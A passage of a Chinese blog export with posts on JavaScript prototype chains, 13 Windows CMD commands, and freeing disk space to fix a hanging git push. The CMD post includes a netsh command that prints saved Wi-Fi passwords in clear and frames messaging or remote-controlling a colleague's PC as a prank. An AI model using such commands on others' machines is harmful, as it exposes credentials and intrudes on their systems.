<li>Function<br>Function.prototype.<code>__ proto__</code> 也是指向 Object.prototype的，但是 Function.prototype 是一个<code>ƒ anonymous()</code>。</li>
<li>Object<br>如果说 Object.prototype 是基类的话，那么Object是啥呢？其实 Object 是函数。<br>是不是有点晕？从JavaScript 语法的角度来说，不仅 Object 是函数，String、Number这些都是函数。</li>
</ul>
<h2 id="再构建一颗大树-——-函数的继承关系"><a href="#再构建一颗大树-——-函数的继承关系" class="headerlink" title="再构建一颗大树 —— 函数的继承关系"></a>再构建一颗大树 —— 函数的继承关系</h2><p>观察上面的图（对象的树）可以发现，我写的都是xxx.prototype 的形式，那为啥不直接写xxx呢？</p>
<p>因为从 JavaScript 的语法的角度来看，Object、String、Number、Array、Function等都是函数，Object.prototype、String.prototype 等才是对象。<br>我们从函数的角度来构造另一颗大树。</p>
<p>依据：xxx.<code>__proto__</code> &#x3D;&#x3D;&#x3D; Function.prototype</p>
<p>即：把Function.prototype看做父类，把他的子类（__proto__指向他的）都画出来。</p>
<p><img src="https://cdn.huatree.top/image-20230819165535056.png" alt="image-20230819165535056"></p>
<p>这里加上“()”，明确一下，然后我们来看一下具体的结构：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819170445848.png" alt="image-20230819170445848"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">String</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819171012052.png" alt="image-20230819171012052"></p>
<p>剩下的自行验证。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Number</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Boolean</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">BigInt</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Symbol</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Date</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">RegExp</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Array</span>);</span><br></pre></td></tr></table></figure>

<h2 id="对象-VS-函数"><a href="#对象-VS-函数" class="headerlink" title="对象 VS 函数"></a>对象 VS 函数</h2><p>对象和函数的树都画完了，然后我们来分析一下对象和函数的区别。</p>
<ul>
<li>对象：是一个容器，可以存放各种类型的实例（数据），包括函数。</li>
<li>构造函数：依据原型创建原型的实例。（个人理解可能有误）</li>
<li>一般函数：就是我们“随手”写的函数，执行某些代码，返回结果（也可以不返回）。</li>
</ul>
<p>从 JavaScript 的语法角度来看，Object、Function、String、Date、Number等都是function，而Object.prototype、String.prototype、Date.prototype、Number.prototype等才是对象。</p>
<p>这和我们经常用到表述方式有点不一样，也正是这个原因，导致理解和表达的时候非常混乱。</p>
<p>我们还是来验证一下：</p>
<p><strong>函数：</strong></p>
<p><img src="https://cdn.huatree.top/image-20230819171455539.png" alt="image-20230819171455539"></p>
<p><strong>对象：</strong></p>
<p><img src="https://cdn.huatree.top/image-20230819171706281.png" alt="image-20230819171706281"></p>
<p>这里有一个特例，Function.prototype 是一个函数，而且是所有函数的源头。</p>
<p>所以说，从 JavaScript 的语法角度来看，函数就是函数，对象就是对象，不存在Object既是对象又是函数的情况。</p>
<p>那么到底是什么关系呢？我们定义一套函数来具体分析一下。</p>
<h2 id="实战：用ES6的class定义一套对象-x2F-函数"><a href="#实战：用ES6的class定义一套对象-x2F-函数" class="headerlink" title="实战：用ES6的class定义一套对象&#x2F;函数"></a>实战：用ES6的class定义一套对象&#x2F;函数</h2><p>ES6提供了class，但是这个并不是类，而是 Function 的语法糖。目的是简化ES5里面，为了实现继承而采用的各种“神操作”。用class来定义，结构和关系会非常清晰，再也不会看着头疼了，建议新手可以跳过ES5的实现方式，直接用ES6的方式。</p>
<p>我们先定义一个Base，然后定义一个Person继承Base，再定义一个Man继承Person。也就是说，可以深层继承。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span> (title) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = <span class="string">&#x27;测试一下基类：&#x27;</span> + title</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">baseFun1</span>(<span class="params">info</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n这是base的函数一，参数：&#x27;</span>, info, <span class="string">&#x27;\nthis：&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span>&#123;</span><br><span class="line">  <span class="title function_">constructor</span> (title, age) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(title)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = <span class="string">&#x27;人类：&#x27;</span> + title</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">personFun1</span>(<span class="params">info</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n这是base的函数一，参数：&#x27;</span>, info, <span class="string">&#x27;\nthis：&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Man</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span> (title, age, date) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(title, age)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = <span class="string">&#x27;男人：&#x27;</span> + title</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">birthday</span> = date</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  manFun3 (msg) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;jim 的 this ===&#x27;</span>, <span class="variable language_">this</span>, msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们打印来看看结构：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Man</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819172949924.png" alt="image-20230819172949924"></p>
<ul>
<li>构造函数 constructor<br>打印结果很清晰的表达了，构造函数就是我们定义的class。</li>
<li>属性<br>属性比较简单，统统都挂在 this 上面，而且是同一个级别。</li>
<li>函数<br>函数就有点复杂了，首先函数是分级别的，挂在每一级的原型上面。<br>Base的函数（baseFun1），挂在Base的原型上面，<strong>proto</strong> 指向原型。<br>Person的函数（PersonFun1），应该挂在Person的原型上面，但是打印结果似乎是，Base好像标错了位置。</li>
<li>原型链<br>Man的实例 &gt; Man的原型 &gt; Person的原型 &gt; Base 的原型 &gt; Object 的原型。<br>通过 <code>__proto__</code> 连接了起来。</li>
</ul>
<p>Man的实例 man1，可以通过这个“链条”，找到 baseFun1，直接用即可（<code>man1.baseFun1()</code>✔），<br>而不需要使用<code>__proto__</code>（<code>man1.__ proto__.__ proto__.__ proto__.baseFun1()</code>✘）</p>
<p>这个和面向对象的继承是一样的效果。</p>
<h3 id="prototype-VS-proto"><a href="#prototype-VS-proto" class="headerlink" title="prototype VS __proto__"></a>prototype VS <code>__proto__</code></h3><p>看上面两个大树，既有 prototype 又有<code>__proto__</code>，好乱的样子。那么怎么办呢？我们可以找一下规律：</p>
<ul>
<li>prototype：<br>prototype 是自己的原型，其原型可以是函数，也可以是对象。有各自的继承体系。</li>
<li><strong>proto</strong> ：<br><strong>proto</strong> 指向上一级原型，并不是自己的，只是一个指针，方便使用父级的方法和属性。<br>可以指向对象，也可以指向函数。</li>
</ul>
<p><img src="https://cdn.huatree.top/image-20230819180215179.png" alt="image-20230819180215179"></p>
<h2 id="组合-VS-继承"><a href="#组合-VS-继承" class="headerlink" title="组合 VS 继承"></a>组合 VS 继承</h2><p>一提到面向对象，大家一般都会想到封装、继承、和多态。但是 JavaScript 却不是这个思路。<br>上面那颗大树看起来是继承的关系，Object.prototype 是基类，派生出来 Object.prototype、Function.prototype、string.prototype等。</p>
<p>但是其实这里面隐藏了组合的方式。</p>
<p>我们展开Object 来看看，就会发现自己进入了一个迷宫。</p>
<p><img src="https://cdn.huatree.top/image-20230819140318738.png" alt="image-20230819140318738"></p>
<h3 id="object-的“特殊”的结构"><a href="#object-的“特殊”的结构" class="headerlink" title="object 的“特殊”的结构"></a>object 的“特殊”的结构</h3><p>看上面的图我们会发现，Object 并不像我们想象的那么简单，有很多的方法，我们随便找几个点开看看：</p>
<p><img src="https://cdn.huatree.top/image-20230819180717861.png" alt="image-20230819180717861"></p>
<p>每一个函数都有自己的原型链（__proto__），是不是有一种进入迷宫的感觉？我当初看的到时候就被吓退了，这都是个啥？</p>
<p>但是我们换个思路来理解，就清晰多了，那就是：组合代替继承！</p>
<p>Object 其实是由若干个函数组合而成。</p>
<p>其实，想一想，JavaScript 没有私有成员，所以各种细节都暴露出来了，所以我们可以看到原型，看到原型链，看到构造函数。</p>
<p>正是因为看到了这么多的细节，而以前又没有一个比较好的封装方式，所以看起来就特别的乱，理解起来也特别头疼。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>按照 JavaScript 的语法来总结，否则总感觉说不清楚。</p>
<ul>
<li><p>对象（xxx.prototype）</p>
<ul>
<li>对象的“根”是 Object.prototype，其上一级是null。</li>
<li>对象只有<code>__proto__</code>，指向上一级对象原型。</li>
<li>对象没有 prototype，因为Object.prototype、String.prototype、Number.prototype等本身就是对象。通过<code>__proto__</code>寻找上一级对象原型。</li>
</ul>
</li>
<li><p>函数</p>
<ul>
<li><p>函数的“根”是 Function.prototype，其上一级是 Object.prototype。</p>
</li>
<li><p>函数有prototype，（JavaScript 语法角度）Object、String、Function、Number 等都是函数，同时也是其原型的构造函数。</p>
</li>
<li><p>函数有<code>__proto__</code>，指向上一级函数。</p>
<p>上面的例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> man1 = <span class="keyword">new</span> <span class="title class_">Man</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(man1.<span class="property">__proto__</span> === <span class="title class_">Man</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>实例只有<code>__proto__</code>（也就是new 一个对象了，对象是没有 prototype的），指向上一级对象原型</p>
<p>实例的 <code>__proto__</code> 访问器属性暴露了此对象的 <code>[[Prototype]]</code>（一个对象或 <code>null</code>）。</p>
<p>了解更多，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto">详见</a></p>
</li>
</ul>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.cnblogs.com/jyk/p/15632822.html">彻底搞清楚 JavaScript 的原型和原型链</a></p>
<p>[2] <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object">MDN - Object</a></p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows必备的13个CMD命令</title>
    <url>/2023/08/20/20230820-Windows%E5%BF%85%E5%A4%87%E7%9A%8413%E4%B8%AACMD%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>学会了约美女同事去….. 有事半功倍的效果！</p>
<span id="more"></span>

<h2 id="1-给对方电脑弹出信息"><a href="#1-给对方电脑弹出信息" class="headerlink" title="1. 给对方电脑弹出信息"></a>1. 给对方电脑弹出信息</h2><p>前提是得知道对方的<code>IP</code>地址。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MSG /server:192.168.1.8 * <span class="string">&quot;七夕快乐!小美，下班后一起去吃饭呐，我是办公室里大壮！&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-查看当前所有连接过的-WIFI-密码"><a href="#2-查看当前所有连接过的-WIFI-密码" class="headerlink" title="2. 查看当前所有连接过的 WIFI 密码"></a>2. 查看当前所有连接过的 WIFI 密码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles</span><br></pre></td></tr></table></figure>

<p>获取其中指定 WiFi 名对应的密码：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netsh wlan show profile name=CMCC-Ah7b-5G key=clear</span><br></pre></td></tr></table></figure>

<p>当您忘记了 WiFi 密码，通过此命令，可以很容易找回的。</p>
<h2 id="3-查看本地-IP-地址"><a href="#3-查看本地-IP-地址" class="headerlink" title="3. 查看本地 IP 地址"></a>3. 查看本地 IP 地址</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p>如果我们想获取更详细的 IP 地址信息，可以输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p>如果想查看外网（公网）地址，可以输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -L ip.tool.lu</span><br></pre></td></tr></table></figure>

<h2 id="4-查看磁盘是否有坏道"><a href="#4-查看磁盘是否有坏道" class="headerlink" title="4. 查看磁盘是否有坏道"></a>4. 查看磁盘是否有坏道</h2><p>前提：需要管理员身份运行（打开）cmd</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chkdsk</span><br></pre></td></tr></table></figure>

<p>主要看坏扇区，对应<code>0KB</code>，是没有问题的。如果大于<code>0KB</code>，则有坏扇区部分，可以输入下面的命令进行修复：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chkdsk /r</span><br></pre></td></tr></table></figure>

<p>如果需要检测所有硬盘，可以输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chkdsk /f</span><br></pre></td></tr></table></figure>

<h2 id="5-检测当前网络是否发生故障"><a href="#5-检测当前网络是否发生故障" class="headerlink" title="5.检测当前网络是否发生故障"></a>5.检测当前网络是否发生故障</h2><p>比如，我要查看博客域名<a href="http://www.huatree.top的绑定的IP网络是否正常，可以输入：">www.huatree.top的绑定的IP网络是否正常，可以输入：</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ping www.huatree.top</span><br></pre></td></tr></table></figure>

<p>输出的结果包含了<a href="http://www.huatree.top绑定的ip地址./">www.huatree.top绑定的IP地址。</a></p>
<p>如果需要持续检测：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ping www.huatree.top -t</span><br></pre></td></tr></table></figure>

<h2 id="6-打开电脑远程控制功能"><a href="#6-打开电脑远程控制功能" class="headerlink" title="6. 打开电脑远程控制功能"></a>6. 打开电脑远程控制功能</h2><p>输入 mstsc，会弹出一个远程桌面连接提示框。计算机栏输入对方的 IP 地址，点击连接，就可以开始控制对方电脑了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mstsc</span><br></pre></td></tr></table></figure>

<h2 id="7-打开计算机性能检测"><a href="#7-打开计算机性能检测" class="headerlink" title="7. 打开计算机性能检测"></a>7. 打开计算机性能检测</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">perfmon.msc</span><br></pre></td></tr></table></figure>

<p>通过这个最新的资源检测器，我们就可以找到当前电脑硬件，比如像是 CPU、磁盘、网络和内存等，它的使用占用率。如果您在你面发现某个进程，它的 CPU 占用率比较高，或者出现卡死情况，那么可以把进程结束掉。</p>
<h2 id="8-修改-CMD-终端字体颜色"><a href="#8-修改-CMD-终端字体颜色" class="headerlink" title="8. 修改 CMD 终端字体颜色"></a>8. 修改 CMD 终端字体颜色</h2><p>先查找字体颜色：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">color all</span><br></pre></td></tr></table></figure>

<p>此时，会列出一堆颜色对应的值，输入想要的颜色对应 key，比如设置淡绿色：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">color A</span><br></pre></td></tr></table></figure>

<p>重新打开 CMD 终端，发现字体颜色恢复到默认值了。如果想永久修改终端字体颜色，那么接下来我们只要通过快捷组合键<code>win + R</code>，输入框中输入 regedit，打开的面板中进行设置：</p>
<p>编辑 -&gt; 查找 -&gt; DefaultColor -&gt; 查找下一个 -&gt; DefaultColor 行，右键选中编辑 -&gt; 输入想要的颜色对应值（color all 列出所有颜色值）-&gt; 改成我们想要的颜色值 -&gt; 确定 -&gt; 重新进入终端生效</p>
<h2 id="9-查看当前电脑用户"><a href="#9-查看当前电脑用户" class="headerlink" title="9. 查看当前电脑用户"></a>9. 查看当前电脑用户</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p>如果出现您不知道的可疑账户，那么很有可能是因为您的电脑被人入侵了。当您电脑被黑客入侵后，对方是会在您的电脑上创建后门账号的，所以这个时候您最好把它删掉。可以通过这个命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net user hacker /del</span><br></pre></td></tr></table></figure>

<h2 id="10-扫描系统是否完整性"><a href="#10-扫描系统是否完整性" class="headerlink" title="10. 扫描系统是否完整性"></a>10. 扫描系统是否完整性</h2><p>如果电脑经常出现卡死或者频繁死机，可以通过下面命令进行扫描当前系统并进行修复：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sfc /scannow</span><br></pre></td></tr></table></figure>

<h2 id="11-打开系统内置捆绑器"><a href="#11-打开系统内置捆绑器" class="headerlink" title="11. 打开系统内置捆绑器"></a>11. 打开系统内置捆绑器</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">IExpress</span><br></pre></td></tr></table></figure>

<h2 id="12-设置定时关机"><a href="#12-设置定时关机" class="headerlink" title="12. 设置定时关机"></a>12. 设置定时关机</h2><p>比如，设置 5 分钟后自动关机。如果需要取消，点击设置定时关机时弹出框的【关闭】按钮。当然，它不会取消这个自动关机的命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">shutdown /s /t 300</span><br></pre></td></tr></table></figure>

<p>如果需要取消这个定时关机的命令，可以输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">shutdown /a</span><br></pre></td></tr></table></figure>

<h2 id="13-过-CMD-实现仿黑客帝国数字雨的代码"><a href="#13-过-CMD-实现仿黑客帝国数字雨的代码" class="headerlink" title="13. 过 CMD 实现仿黑客帝国数字雨的代码"></a>13. 过 CMD 实现仿黑客帝国数字雨的代码</h2><p>先创建<code>.txt</code>格式的文件，复制粘贴下面的内容，保存退出，然后修改文件格式为<code>.cmd</code>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:line</span><br><span class="line">color 0a</span><br><span class="line">setlocal ENABLEDELAYEDEXPANSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (0) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;line=&quot;</span></span><br><span class="line"><span class="keyword">for</span> /l %%j <span class="keyword">in</span> (1,1,80) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> /a Down%%j-=2</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;x=!Down%%j!&quot;</span></span><br><span class="line"><span class="keyword">if</span> !x! LSS 0 (</span><br><span class="line"><span class="built_in">set</span> /a Arrow%%j=!random!%%3</span><br><span class="line"><span class="built_in">set</span> /a Down%%j=!random!%%15+10</span><br><span class="line">)</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;x=!Arrow%%j!&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;!x!&quot;</span> == <span class="string">&quot;2&quot;</span> (</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;line=!line!!random:~-1! &quot;</span></span><br><span class="line">) <span class="keyword">else</span> (<span class="built_in">set</span> <span class="string">&quot;line=!line! &quot;</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">set</span> /p=!line!&lt;nul</span><br><span class="line">)</span><br><span class="line">goto line</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.freedidi.com/8968.html">Windows 必备的 13 个 CMD 命令，学会了约美女同事去….. 有事半功倍的效果！ | 零度解说</a></p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>window</tag>
      </tags>
  </entry>
  <entry>
    <title>解决git push时卡在total</title>
    <url>/2023/11/26/20231126-%E8%A7%A3%E5%86%B3git-push%E6%97%B6%E5%8D%A1%E5%9C%A8total/</url>
    <content><![CDATA[<p>整个事情的发生是这样的：有段时间没更新文章了，突然最近有点东西需要记录分享下，就写了篇文章，依旧之前的老套路调教下 hexo，啊呸，依旧推送到云服务器上的 git 仓库，这次，我挂彩了。在我正装待发时（git push）,出现了意想不到的情况：它不工作了，它定在了<code>&quot;Total 5 (delta 2), reused 0 (delta 0), pack-reused 0&quot;</code>！欲知后事如何，请啃完全文。</p>
<span id="more"></span>

<h2 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h2><p>直接无脑上搜索了，搜了半天，出来个这个：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> sendpack.sideband <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>抱着死马当活马医的心态，直接在项目根目录下上此命令。很平静啊，没有意思反应，我停留了片刻，这是正常现象，git 的配置设置，命令敲完不输出提示内容。当我再次<code>git push</code>，哇，情况好转了，至少不会卡在<code>Total 5 (delta 2), reused 0 (delta 0), pack-reused 0</code>了。此时，控制台抛出了错误提示，看到希望了。</p>
<p>错误提示内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">error: remote unpack failed: unable to create temporary object directory To 120.48.58.244:/home/gitRepo/yujian.git</span><br></pre></td></tr></table></figure>

<p>很好，简单翻译下：无法常见临时目录。很明显嘛，这啥……看不懂！又一次无脑上搜索，找啊找啊找解决方法。边找边想，脑袋里闪现 2 个思路：权限、存储限制。</p>
<p>权限这块，之前都能正常推送到远程仓库，这个思路直接砍掉。</p>
<p>存储，联想到 g 推送是报错内容：<code>unable to create temporary object directory</code>，这不就是版本答案吗。</p>
<p>我悟了！云服务器存储不够了，我飞快的调出平时不常用的 Xshell 7，麻了，还要更新才能用，带着激动的心情，更新好后进入云服务系统 linux debian，直接查水表，看看是不是系统剩余存储不够了。好家伙，我直接好家伙，居然被榨的一点剩余空间都没有了……呜呜呜。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -h</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20231126203833416.png" alt="image-20231126203833416"></p>
<p><img src="https://cdn.huatree.top/image-20231126210753216.jpg" alt="4e77750f5a92165a888db911018d790"></p>
<p><img src="https://cdn.huatree.top/image-20231126210835587.jpg" alt="b152c9c27e5362b9036721b697c0095"></p>
<p><img src="https://cdn.huatree.top/image-20231126210853075.jpg" alt="df70a99b5f581871edcac29f008a450"></p>
<h2 id="x2F-etc-x2F-coredumps"><a href="#x2F-etc-x2F-coredumps" class="headerlink" title="&#x2F;etc&#x2F;coredumps"></a>&#x2F;etc&#x2F;coredumps</h2><p>目录 <code>/etc/coredumps</code> 通常用于存放核心转储文件（core dumps）的配置文件，而不是存放核心转储文件本身的目录。核心转储文件是在程序崩溃时生成的二进制文件，它包含了程序在崩溃时的内存和寄存器状态等信息，有助于开发人员分析崩溃原因。</p>
<p>如果你发现 <code>/etc/coredumps</code> 下存放的是核心转储文件而不是配置文件，那么这可能是一个误操作或者系统异常的结果。在正常情况下，核心转储文件通常存放在运行程序的工作目录（或其他指定的目录）中。</p>
<p>请在执行删除操作之前，确保你理解这些文件的作用以及删除可能产生的影响。如果你不确定是否可以删除 <code>/etc/coredumps</code> 目录中的文件，建议先备份这个目录或者咨询系统管理员。</p>
<p>我又查看了下<code>/etc/coredumps</code>目录中的文件，纠结了一会儿，果断删除，大不了重来过（重装系统，最坏的打算，提前备份好重要文件及配置）。</p>
<h3 id="删除-x2F-etc-x2F-coredumps"><a href="#删除-x2F-etc-x2F-coredumps" class="headerlink" title="删除&#x2F;etc&#x2F;coredumps"></a>删除&#x2F;etc&#x2F;coredumps</h3><p>rm 直接干</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /etc/coredumps/*</span><br></pre></td></tr></table></figure>

<p>出错误了：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-bash: /bin/rm: Argument list too long</span><br></pre></td></tr></table></figure>

<p>这错误是因为命令行参数列表太长，导致 <code>rm</code> 命令无法处理这么多文件。有几种方法可以解决这个问题：</p>
<h4 id="使用-find-命令删除"><a href="#使用-find-命令删除" class="headerlink" title="使用 find 命令删除"></a>使用 <code>find</code> 命令删除</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find coredumps/ -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>这个命令会使用 <code>find</code> 来查找 <code>coredumps/</code> 目录下的所有文件，并逐一删除它们。</p>
<h4 id="使用-xargs"><a href="#使用-xargs" class="headerlink" title="使用 xargs"></a>使用 <code>xargs</code></h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find coredumps/ -<span class="built_in">type</span> f | xargs <span class="built_in">rm</span> -f</span><br></pre></td></tr></table></figure>

<p>这个命令使用 <code>find</code> 找到文件，然后将它们传递给 <code>xargs</code>，<code>xargs</code> 再将它们传递给 <code>rm</code>。</p>
<h4 id="使用-find-的-delete-选项"><a href="#使用-find-的-delete-选项" class="headerlink" title="使用 find 的 -delete 选项"></a>使用 <code>find</code> 的 <code>-delete</code> 选项</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find coredumps/ -<span class="built_in">type</span> f -delete</span><br></pre></td></tr></table></figure>

<p>这个命令直接在 <code>find</code> 中使用 <code>-delete</code> 选项，而不是使用 <code>-exec</code> 来调用 <code>rm</code>。</p>
<p>这三种方法都可以避免命令行参数列表过长的问题。请根据你的需求选择其中一种。在运行这些命令之前，请确保你确实想要删除这些文件，因为删除后是无法恢复的。</p>
<p>最终，选择了第一种，就看它顺眼：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find coredumps/ -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>文件 list 太多了，此时等待了下 5 分钟左右，成功删除<code>/etc/coredumps</code>目录中的所有文件。</p>
<h2 id="限制-core-dump-file-大小"><a href="#限制-core-dump-file-大小" class="headerlink" title="限制 core dump file 大小"></a>限制 core dump file 大小</h2><p>在 Linux 系统上，我们可以使用 ulimit 命令来设置核心转储文件（core dump file）的大小限制。以下是一些步骤和示例，演示如何设置核心转储文件的大小限制。</p>
<h3 id="通过修改-x2F-etc-x2F-security-x2F-limits-conf"><a href="#通过修改-x2F-etc-x2F-security-x2F-limits-conf" class="headerlink" title="通过修改 &#x2F;etc&#x2F;security&#x2F;limits.conf"></a>通过修改 &#x2F;etc&#x2F;security&#x2F;limits.conf</h3><ol>
<li><p>打开 <code>/etc/security/limits.conf</code> 文件。</p>
<p> 这里我用的 xftp 7，直接找到文件编辑保存。</p>
</li>
<li><p>在文件的末尾添加以下行，表示设置所有用户的核心转储文件大小限制；</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">*    soft    core    102400</span><br></pre></td></tr></table></figure>

<p> 102400：表示 100MB，1MB&#x3D;1024KB</p>
</li>
<li><p>如果希望核心转储文件被完全禁用，直接：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">*    soft    core    0</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证设置是否生效。</p>
<p> 使用 <code>ulimit -c</code> 再次检查核心转储文件大小限制，确保它已经被正确设置。</p>
</li>
<li><p>重新登录或重新启动云服务器的 linux debian，以使更改生效。</p>
</li>
</ol>
<p>这样，我们就可以通过 ulimit 命令或修改 <code>/etc/security/limits.conf</code> 文件来设置核心转储文件的大小限制。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><code>git push</code>走一遍，OK，成功了！我们成功啦！感谢看到这里的伙伴们，我们下篇文章见。</p>
